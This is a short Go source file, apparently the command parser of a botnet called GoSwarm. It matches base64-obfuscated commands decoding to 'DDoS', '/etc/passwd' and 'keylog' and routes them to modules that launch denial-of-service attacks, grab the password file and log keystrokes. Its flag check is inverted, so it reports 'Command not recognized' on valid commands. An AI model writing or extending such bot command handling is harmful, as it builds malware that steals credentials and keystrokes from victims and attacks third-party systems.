package parser

import (
	"fmt"
	"strings"

	"github.com/Pimmytrousers/GoSwarm/modules"
)

func Parse(cmd string) {
	var output = ""
	flag := 0
	if strings.Contains(cmd, "RERvUw==") {
		output = modules.DDoS()
		flag = 1
	}
	if strings.Contains(cmd, "L2V0Yy9wYXNzd2QNCg==") {
		output = modules.GrabPasswd()
		flag = 1
	}
	if strings.Contains(cmd, "a2V5bG9nDQo") {
		output = modules.Keylogg()
		flag = 1
	}
	if flag == 1 {
		fmt.Println("Command not recognized")
	}
	fmt.Println(output)
}
